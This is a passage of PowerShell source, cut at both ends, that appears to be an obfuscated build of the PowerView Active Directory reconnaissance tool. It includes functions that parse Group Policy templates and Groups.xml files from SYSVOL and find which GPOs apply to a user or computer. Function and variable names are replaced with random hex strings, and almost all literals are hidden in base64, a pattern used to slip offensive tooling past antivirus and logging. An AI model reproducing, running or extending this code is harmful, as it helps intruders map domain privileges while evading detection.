                ${d638a9a290404250abd748181bf51fd6} += $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XABNAEEAQwBIAEkATgBFAFwATQBpAGMAcgBvAHMAbwBmAHQAXABXAGkAbgBkAG8AdwBzACAATgBUAFwAUwBlAGMARQBkAGkAdABcAEcAcAB0AFQAbQBwAGwALgBpAG4AZgA=')))
            }
            Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEcAcAB0AFQAbQBwAGwAXQAgAFAAYQByAHMAaQBuAGcAIABHAHAAdABUAG0AcABsAFAAYQB0AGgAOgAgACQAewBkADYAMwA4AGEAOQBhADIAOQAwADQAMAA0ADIANQAwAGEAYgBkADcANAA4ADEAOAAxAGIAZgA1ADEAZgBkADYAfQA=')))
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwB1AHQAcAB1AHQATwBiAGoAZQBjAHQA')))]) {
                ${ff3751ba2605444aa0dbc9330d83e69a} = a08b2dc4f53043ccbee4608b1cf113eb -Path ${d638a9a290404250abd748181bf51fd6} -e6bf711304b24cf590cbb5b6c4bdb1de -ErrorAction Stop
                if (${ff3751ba2605444aa0dbc9330d83e69a}) {
                    ${ff3751ba2605444aa0dbc9330d83e69a} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABhAHQAaAA='))) ${d638a9a290404250abd748181bf51fd6}
                    ${ff3751ba2605444aa0dbc9330d83e69a}
                }
            }
            else {
                ${ff3751ba2605444aa0dbc9330d83e69a} = a08b2dc4f53043ccbee4608b1cf113eb -Path ${d638a9a290404250abd748181bf51fd6} -ErrorAction Stop
                if (${ff3751ba2605444aa0dbc9330d83e69a}) {
                    ${ff3751ba2605444aa0dbc9330d83e69a}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABhAHQAaAA=')))] = ${d638a9a290404250abd748181bf51fd6}
                    ${ff3751ba2605444aa0dbc9330d83e69a}
                }
            }
        }
        catch {
            Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEcAcAB0AFQAbQBwAGwAXQAgAEUAcgByAG8AcgAgAHAAYQByAHMAaQBuAGcAIAAkAHsAZAA2ADMAOABhADkAYQAyADkAMAA0ADAANAAyADUAMABhAGIAZAA3ADQAOAAxADgAMQBiAGYANQAxAGYAZAA2AH0AIAA6ACAAJABfAA==')))
        }
    }
    END {
        ${ecbd21444b104416a9e24560a9dbf3bd}.Keys | ForEach-Object { a7d442a86d1b4ceeaa8f4ca925e39550 -Path $_ }
    }
}
function a4d6c5a47cb34390bc3b7adaffdbff05 {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.GroupsXML')]
    [CmdletBinding()]
    Param (
        [Parameter(Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('Path')]
        [String]
        $GroupsXMLPath,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        ${ecbd21444b104416a9e24560a9dbf3bd} = @{}
    }
    PROCESS {
        try {
            if (($GroupsXMLPath -Match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XABcAFwAXAAuACoAXABcAC4AKgA=')))) -and ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))])) {
                ${c0e3b82e27dd42af96f036e8f0ea87c8} = "\\$((New-Object System.Uri($GroupsXMLPath)).Host)\SYSVOL"
                if (-not ${ecbd21444b104416a9e24560a9dbf3bd}[${c0e3b82e27dd42af96f036e8f0ea87c8}]) {
                    b62ba051179546ed8285f6844e069492 -Path ${c0e3b82e27dd42af96f036e8f0ea87c8} -Credential $Credential
                    ${ecbd21444b104416a9e24560a9dbf3bd}[${c0e3b82e27dd42af96f036e8f0ea87c8}] = $True
                }
            }
            [XML]${4e90d5741b1443769644606f8089c3bf} = Get-Content -Path $GroupsXMLPath -ErrorAction Stop
            ${4e90d5741b1443769644606f8089c3bf} | Select-Xml $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LwBHAHIAbwB1AHAAcwAvAEcAcgBvAHUAcAA='))) | Select-Object -ExpandProperty node | ForEach-Object {
                ${14eb3c56654d4851b0c0e59e10d33e62} = $_.Properties.groupName
                ${2d7c476caf164b22affc257b54255fe1} = $_.Properties.groupSid
                if (-not ${2d7c476caf164b22affc257b54255fe1}) {
                    if (${14eb3c56654d4851b0c0e59e10d33e62} -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBkAG0AaQBuAGkAcwB0AHIAYQB0AG8AcgBzAA==')))) {
                        ${2d7c476caf164b22affc257b54255fe1} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0AMwAyAC0ANQA0ADQA')))
                    }
                    elseif (${14eb3c56654d4851b0c0e59e10d33e62} -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAG0AbwB0AGUAIABEAGUAcwBrAHQAbwBwAA==')))) {
                        ${2d7c476caf164b22affc257b54255fe1} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0AMwAyAC0ANQA1ADUA')))
                    }
                    elseif (${14eb3c56654d4851b0c0e59e10d33e62} -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwB1AGUAcwB0AHMA')))) {
                        ${2d7c476caf164b22affc257b54255fe1} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0AMwAyAC0ANQA0ADYA')))
                    }
                    else {
                        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) {
                            ${2d7c476caf164b22affc257b54255fe1} = dc5909cabc884d258719b96ec7cf3c2b -d43566a07dda43778aacb7392fc974f0 ${14eb3c56654d4851b0c0e59e10d33e62} -Credential $Credential
                        }
                        else {
                            ${2d7c476caf164b22affc257b54255fe1} = dc5909cabc884d258719b96ec7cf3c2b -d43566a07dda43778aacb7392fc974f0 ${14eb3c56654d4851b0c0e59e10d33e62}
                        }
                    }
                }
                ${805886bfe59f43f7b547a914109edc67} = $_.Properties.members | Select-Object -ExpandProperty Member | Where-Object { $_.action -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBEAEQA'))) } | ForEach-Object {
                    if ($_.sid) { $_.sid }
                    else { $_.name }
                }
                if (${805886bfe59f43f7b547a914109edc67}) {
                    if ($_.filters) {
                        ${240db24f27734345ae79965d51b220ef} = $_.filters.GetEnumerator() | ForEach-Object {
                            New-Object -TypeName PSObject -Property @{'Type' = $_.LocalName;'Value' = $_.name}
                        }
                    }
                    else {
                        ${240db24f27734345ae79965d51b220ef} = $Null
                    }
                    if (${805886bfe59f43f7b547a914109edc67} -isnot [System.Array]) { ${805886bfe59f43f7b547a914109edc67} = @(${805886bfe59f43f7b547a914109edc67}) }
                    ${3a8b9e1997ca48efa7a9751901f19303} = New-Object PSObject
                    ${3a8b9e1997ca48efa7a9751901f19303} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBQAE8AUABhAHQAaAA='))) $TargetGroupsXMLPath
                    ${3a8b9e1997ca48efa7a9751901f19303} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBpAGwAdABlAHIAcwA='))) ${240db24f27734345ae79965d51b220ef}
                    ${3a8b9e1997ca48efa7a9751901f19303} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwByAG8AdQBwAE4AYQBtAGUA'))) ${14eb3c56654d4851b0c0e59e10d33e62}
                    ${3a8b9e1997ca48efa7a9751901f19303} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwByAG8AdQBwAFMASQBEAA=='))) ${2d7c476caf164b22affc257b54255fe1}
                    ${3a8b9e1997ca48efa7a9751901f19303} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwByAG8AdQBwAE0AZQBtAGIAZQByAE8AZgA='))) $Null
                    ${3a8b9e1997ca48efa7a9751901f19303} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwByAG8AdQBwAE0AZQBtAGIAZQByAHMA'))) ${805886bfe59f43f7b547a914109edc67}
                    ${3a8b9e1997ca48efa7a9751901f19303}.PSObject.TypeNames.Insert(0, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAHcAZQByAFYAaQBlAHcALgBHAHIAbwB1AHAAcwBYAE0ATAA='))))
                    ${3a8b9e1997ca48efa7a9751901f19303}
                }
            }
        }
        catch {
            Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEcAcgBvAHUAcABzAFgATQBMAF0AIABFAHIAcgBvAHIAIABwAGEAcgBzAGkAbgBnACAAJABUAGEAcgBnAGUAdABHAHIAbwB1AHAAcwBYAE0ATABQAGEAdABoACAAOgAgACQAXwA=')))
        }
    }
    END {
        ${ecbd21444b104416a9e24560a9dbf3bd}.Keys | ForEach-Object { a7d442a86d1b4ceeaa8f4ca925e39550 -Path $_ }
    }
}
function b86c55f8931f4479ba4635fb6773bb3f {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseDeclaredVarsMoreThanAssignments', '')]
    [OutputType('PowerView.GPO')]
    [OutputType('PowerView.GPO.Raw')]
    [CmdletBinding(DefaultParameterSetName = 'None')]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DistinguishedName', 'SamAccountName', 'Name')]
        [String[]]
        $Identity,
        [Parameter(ParameterSetName = 'ComputerIdentity')]
        [Alias('ComputerName')]
        [ValidateNotNullOrEmpty()]
        [String]
        ${bf90b228420f4b8eb6904571ce2a00df},
        [Parameter(ParameterSetName = 'UserIdentity')]
        [Alias('UserName')]
        [ValidateNotNullOrEmpty()]
        [String]
        $UserIdentity,
        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,
        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $LDAPFilter,
        [ValidateNotNullOrEmpty()]
        [String[]]
        $Properties,
        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $SearchBase,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,
        [ValidateSet('Dacl', 'Group', 'None', 'Owner', 'Sacl')]
        [String]
        $SecurityMasks,
        [Switch]
        $Tombstone,
        [Alias('ReturnOne')]
        [Switch]
        $FindOne,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty,
        [Switch]
        $Raw
    )
    BEGIN {
        ${afd7d337a750465cb1eadfa1f8ae176d} = @{}
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))]) { ${afd7d337a750465cb1eadfa1f8ae176d}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = $Domain }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAG8AcABlAHIAdABpAGUAcwA=')))]) { ${afd7d337a750465cb1eadfa1f8ae176d}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAG8AcABlAHIAdABpAGUAcwA=')))] = $Properties }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))]) { ${afd7d337a750465cb1eadfa1f8ae176d}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))] = $SearchBase }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))]) { ${afd7d337a750465cb1eadfa1f8ae176d}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))] = $Server }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))]) { ${afd7d337a750465cb1eadfa1f8ae176d}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))] = $SearchScope }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))]) { ${afd7d337a750465cb1eadfa1f8ae176d}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))] = $ResultPageSize }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))]) { ${afd7d337a750465cb1eadfa1f8ae176d}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))] = $ServerTimeLimit }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGMAdQByAGkAdAB5AE0AYQBzAGsAcwA=')))]) { ${afd7d337a750465cb1eadfa1f8ae176d}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGMAdQByAGkAdAB5AE0AYQBzAGsAcwA=')))] = $SecurityMasks }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))]) { ${afd7d337a750465cb1eadfa1f8ae176d}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))] = $Tombstone }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { ${afd7d337a750465cb1eadfa1f8ae176d}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
        ${463eb6beb0eb476aa61989bb04f75042} = d99af1f025294e4b8cf632a3987179c6 @afd7d337a750465cb1eadfa1f8ae176d
    }
    PROCESS {
        if (${463eb6beb0eb476aa61989bb04f75042}) {
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAEkAZABlAG4AdABpAHQAeQA=')))] -or $PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgBJAGQAZQBuAHQAaQB0AHkA')))]) {
                ${3b0b19d086a246bc9e965b35f4a7758f} = @()
                if (${afd7d337a750465cb1eadfa1f8ae176d}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAG8AcABlAHIAdABpAGUAcwA=')))]) {
                    ${f1a750d612c847b28c1661f5f4353256} = ${afd7d337a750465cb1eadfa1f8ae176d}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAG8AcABlAHIAdABpAGUAcwA=')))]
                }
                ${afd7d337a750465cb1eadfa1f8ae176d}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAG8AcABlAHIAdABpAGUAcwA=')))] = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZABpAHMAdABpAG4AZwB1AGkAcwBoAGUAZABuAGEAbQBlACwAZABuAHMAaABvAHMAdABuAGEAbQBlAA==')))
                ${21ce4c4eb6224b4495064b7f5910e227} = $Null
                if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAEkAZABlAG4AdABpAHQAeQA=')))]) {
                    ${afd7d337a750465cb1eadfa1f8ae176d}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBkAGUAbgB0AGkAdAB5AA==')))] = ${bf90b228420f4b8eb6904571ce2a00df}
                    ${a9e149a622e146cb8c4c690f286bb4b0} = cec1def5409041f78ed8ecd436f7fa52 @afd7d337a750465cb1eadfa1f8ae176d -FindOne | Select-Object -First 1
                    if(-not ${a9e149a622e146cb8c4c690f286bb4b0}) {
                        Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAEcAUABPAF0AIABDAG8AbQBwAHUAdABlAHIAIAAnACQAewBiAGYAOQAwAGIAMgAyADgANAAyADAAZgA0AGIAOABlAGIANgA5ADAANAA1ADcAMQBjAGUAMgBhADAAMABkAGYAfQAnACAAbgBvAHQAIABmAG8AdQBuAGQAIQA=')))
                    }
                    ${5c9e4befbd7045278c649df1e23e1dc8} = ${a9e149a622e146cb8c4c690f286bb4b0}.distinguishedname
                    ${21ce4c4eb6224b4495064b7f5910e227} = ${a9e149a622e146cb8c4c690f286bb4b0}.dnshostname
                }
                else {
                    ${afd7d337a750465cb1eadfa1f8ae176d}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBkAGUAbgB0AGkAdAB5AA==')))] = $UserIdentity
                    ${a8824b20a55c40d29e08c2f892a05f8e} = c4bfd1c2423d4aa09ab761a468a38f7e @afd7d337a750465cb1eadfa1f8ae176d -FindOne | Select-Object -First 1
                    if(-not ${a8824b20a55c40d29e08c2f892a05f8e}) {
                        Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAEcAUABPAF0AIABVAHMAZQByACAAJwAkAFUAcwBlAHIASQBkAGUAbgB0AGkAdAB5ACcAIABuAG8AdAAgAGYAbwB1AG4AZAAhAA==')))
                    }
                    ${5c9e4befbd7045278c649df1e23e1dc8} = ${a8824b20a55c40d29e08c2f892a05f8e}.distinguishedname
                }
                ${59b49a4fa22f45adb9071d8ab1794fc7} = @()
                ${59b49a4fa22f45adb9071d8ab1794fc7} += ${5c9e4befbd7045278c649df1e23e1dc8}.split(',') | ForEach-Object {
                    if($_.startswith($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwBVAD0A'))))) {
                        ${5c9e4befbd7045278c649df1e23e1dc8}.SubString(${5c9e4befbd7045278c649df1e23e1dc8}.IndexOf("$($_),"))
                    }
                }
                Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAEcAUABPAF0AIABvAGIAagBlAGMAdAAgAE8AVQBzADoAIAAkAHsANQA5AGIANAA5AGEANABmAGEAMgAyAGYANAA1AGEAZABiADkAMAA3ADEAZAA4AGEAYgAxADcAOQA0AGYAYwA3AH0A')))
                if (${59b49a4fa22f45adb9071d8ab1794fc7}) {
                    ${afd7d337a750465cb1eadfa1f8ae176d}.Remove($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAG8AcABlAHIAdABpAGUAcwA='))))
                    ${8b987fb7b5c94362ad81a32857d1a133} = $False
                    ForEach(${e732cf48eaa148608da1cb15e49df75b} in ${59b49a4fa22f45adb9071d8ab1794fc7}) {
                        ${afd7d337a750465cb1eadfa1f8ae176d}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBkAGUAbgB0AGkAdAB5AA==')))] = ${e732cf48eaa148608da1cb15e49df75b}
                        ${3b0b19d086a246bc9e965b35f4a7758f} += a441e23e2e174a0185672157e28acb2c @afd7d337a750465cb1eadfa1f8ae176d | ForEach-Object {
                            if ($_.gplink) {
                                $_.gplink.split('][') | ForEach-Object {
                                    if ($_.startswith($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABEAEEAUAA='))))) {
                                        ${372dd4b251bb473babaef2b053830ee6} = $_.split(';')
                                        ${97be4aa89c724d778c50577152e7ca6d} = ${372dd4b251bb473babaef2b053830ee6}[0]
                                        ${a029728363de43b78eafa94eb1c4df94} = ${372dd4b251bb473babaef2b053830ee6}[1]
                                        if (${8b987fb7b5c94362ad81a32857d1a133}) {
                                            if (${a029728363de43b78eafa94eb1c4df94} -eq 2) {
                                                ${97be4aa89c724d778c50577152e7ca6d}
                                            }
                                        }
                                        else {
                                            ${97be4aa89c724d778c50577152e7ca6d}
                                        }
                                    }
                                }
                            }
                            if ($_.gpoptions -eq 1) {
                                ${8b987fb7b5c94362ad81a32857d1a133} = $True
                            }
                        }
                    }
                }
                if (${21ce4c4eb6224b4495064b7f5910e227}) {
                    ${83894a214ed54e198ca73dd3e40441d8} = (c738055cf72946c7a5b1df0a9dc66984 -ac645935110b4eaea96e7bf6f0b2d7f4 ${21ce4c4eb6224b4495064b7f5910e227}).SiteName
                    if(${83894a214ed54e198ca73dd3e40441d8} -and (${83894a214ed54e198ca73dd3e40441d8} -notlike $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQByAHIAbwByACoA'))))) {
                        ${afd7d337a750465cb1eadfa1f8ae176d}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBkAGUAbgB0AGkAdAB5AA==')))] = ${83894a214ed54e198ca73dd3e40441d8}
                        ${3b0b19d086a246bc9e965b35f4a7758f} += da03d47a936449b487ea369a2ced591f @afd7d337a750465cb1eadfa1f8ae176d | ForEach-Object {
                            if($_.gplink) {
                                $_.gplink.split('][') | ForEach-Object {
                                    if ($_.startswith($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABEAEEAUAA='))))) {
                                        $_.split(';')[0]
                                    }
                                }
                            }
                        }
                    }
                }
                ${345f8b63f37244258781882e2378d988} = ${5c9e4befbd7045278c649df1e23e1dc8}.SubString(${5c9e4befbd7045278c649df1e23e1dc8}.IndexOf($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABDAD0A')))))
                ${afd7d337a750465cb1eadfa1f8ae176d}.Remove($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBkAGUAbgB0AGkAdAB5AA=='))))
                ${afd7d337a750465cb1eadfa1f8ae176d}.Remove($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAG8AcABlAHIAdABpAGUAcwA='))))
                ${afd7d337a750465cb1eadfa1f8ae176d}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABEAEEAUABGAGkAbAB0AGUAcgA=')))] = $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KABvAGIAagBlAGMAdABjAGwAYQBzAHMAPQBkAG8AbQBhAGkAbgApACgAZABpAHMAdABpAG4AZwB1AGkAcwBoAGUAZABuAGEAbQBlAD0AJAB7ADMANAA1AGYAOABiADYAMwBmADMANwAyADQANAAyADUAOAA3ADgAMQA4ADgAMgBlADIAMwA3ADgAZAA5ADgAOAB9ACkA')))
                ${3b0b19d086a246bc9e965b35f4a7758f} += dc2f41a670d5455b8f64f106e1b09449 @afd7d337a750465cb1eadfa1f8ae176d | ForEach-Object {
                    if($_.gplink) {
                        $_.gplink.split('][') | ForEach-Object {
                            if ($_.startswith($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABEAEEAUAA='))))) {
                                $_.split(';')[0]
                            }
                        }
                    }
                }
                Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAEcAUABPAF0AIABHAFAATwBBAGQAcwBQAGEAdABoAHMAOgAgACQAewAzAGIAMABiADEAOQBkADAAOAA2AGEAMgA0ADYAYgBjADkAZQA5ADYANQBiADMANQBmADQAYQA3ADcANQA4AGYAfQA=')))
                if (${f1a750d612c847b28c1661f5f4353256}) { ${afd7d337a750465cb1eadfa1f8ae176d}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAG8AcABlAHIAdABpAGUAcwA=')))] = ${f1a750d612c847b28c1661f5f4353256} }
                else { ${afd7d337a750465cb1eadfa1f8ae176d}.Remove($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAG8AcABlAHIAdABpAGUAcwA=')))) }
                ${afd7d337a750465cb1eadfa1f8ae176d}.Remove($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBkAGUAbgB0AGkAdAB5AA=='))))
                ${3b0b19d086a246bc9e965b35f4a7758f} | Where-Object {$_ -and ($_ -ne '')} | ForEach-Object {
                    ${afd7d337a750465cb1eadfa1f8ae176d}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))] = $_
                    ${afd7d337a750465cb1eadfa1f8ae176d}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABEAEEAUABGAGkAbAB0AGUAcgA=')))] = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KABvAGIAagBlAGMAdABDAGEAdABlAGcAbwByAHkAPQBnAHIAbwB1AHAAUABvAGwAaQBjAHkAQwBvAG4AdABhAGkAbgBlAHIAKQA=')))
                    dc2f41a670d5455b8f64f106e1b09449 @afd7d337a750465cb1eadfa1f8ae176d | ForEach-Object {
                        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBhAHcA')))]) {
                            $_.PSObject.TypeNames.Insert(0, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAHcAZQByAFYAaQBlAHcALgBHAFAATwAuAFIAYQB3AA=='))))
                        }
                        else {
                            $_.PSObject.TypeNames.Insert(0, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAHcAZQByAFYAaQBlAHcALgBHAFAATwA='))))
                        }
                        $_
                    }
                }
            }
            else {
                ${fb29aaa2f9c140909efae41cb42f1bef} = ''
                $Filter = ''
                $Identity | Where-Object {$_} | ForEach-Object {
                    ${56aaa31f880a49e195bcf739ac331528} = $_.Replace('(', $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XAAyADgA')))).Replace(')', $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XAAyADkA'))))
                    if (${56aaa31f880a49e195bcf739ac331528} -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABEAEEAUAA6AC8ALwB8AF4AQwBOAD0ALgAqAA==')))) {
                        ${fb29aaa2f9c140909efae41cb42f1bef} += $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KABkAGkAcwB0AGkAbgBnAHUAaQBzAGgAZQBkAG4AYQBtAGUAPQAkAHsANQA2AGEAYQBhADMAMQBmADgAOAAwAGEANAA5AGUAMQA5ADUAYgBjAGYANwAzADkAYQBjADMAMwAxADUAMgA4AH0AKQA=')))
                        if ((-not $PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))]) -and (-not $PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))])) {
                            ${7eef0517afe94597af8ab4be39a72451} = ${56aaa31f880a49e195bcf739ac331528}.SubString(${56aaa31f880a49e195bcf739ac331528}.IndexOf($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABDAD0A'))))) -replace $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABDAD0A'))),'' -replace ',','.'
                            Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAEcAUABPAF0AIABFAHgAdAByAGEAYwB0AGUAZAAgAGQAbwBtAGEAaQBuACAAJwAkAHsANwBlAGUAZgAwADUAMQA3AGEAZgBlADkANAA1ADkANwBhAGYAOABhAGIANABiAGUAMwA5AGEANwAyADQANQAxAH0AJwAgAGYAcgBvAG0AIAAnACQAewA1ADYAYQBhAGEAMwAxAGYAOAA4ADAAYQA0ADkAZQAxADkANQBiAGMAZgA3ADMAOQBhAGMAMwAzADEANQAyADgAfQAnAA==')))
                            ${afd7d337a750465cb1eadfa1f8ae176d}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = ${7eef0517afe94597af8ab4be39a72451}
                            ${463eb6beb0eb476aa61989bb04f75042} = d99af1f025294e4b8cf632a3987179c6 @afd7d337a750465cb1eadfa1f8ae176d
                            if (-not ${463eb6beb0eb476aa61989bb04f75042}) {
